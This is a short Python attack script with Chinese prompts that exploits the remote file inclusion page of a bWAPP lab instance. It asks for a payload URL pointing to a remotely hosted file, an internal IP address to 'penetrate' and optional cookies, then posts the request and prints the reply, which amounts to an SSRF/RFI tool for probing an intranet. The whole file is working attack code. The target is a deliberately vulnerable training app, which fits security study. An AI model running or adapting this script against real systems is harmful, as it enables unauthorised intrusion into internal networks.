# coding:utf-8
import requests
import json

payload = input('请输入payload（例http://某个引入文件ip/ssrf.txt）：')
if(payload == ''):	
    print("请输入payload！")
    exit()
else:
   url = 'http://192.168.133.128/bWAPP/bWAPP/rlfi.php?language='+payload+'&action=go'


data = input('请输入需要渗透内网的ip地址：（ip=192.168.133.149）')
headers = {'Content-type':'application/x-www-form-urlencoded'}


cookies={}
states = input('是否含有cookie（Y/N）：')
if(states == 'y' or states == 'Y'):
    cookies_str = input('输入cookies(字符1:值1,字符2:值2)：').split(",")
    for i in cookies_str:
        keyvalue = i.split(":")
        cookies[keyvalue[0]] = keyvalue[1]
else:
    pass

r = requests.post(url, data=data, cookies=cookies,headers=headers)
print(r.text)

